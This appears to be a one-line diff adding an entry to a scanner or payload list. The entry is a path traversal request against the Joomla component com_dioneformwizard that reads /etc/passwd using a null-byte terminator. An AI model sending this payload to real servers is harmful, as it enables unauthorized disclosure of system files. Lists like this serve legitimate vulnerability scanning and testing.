@@ -1,0 +1,1 @@
+/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00
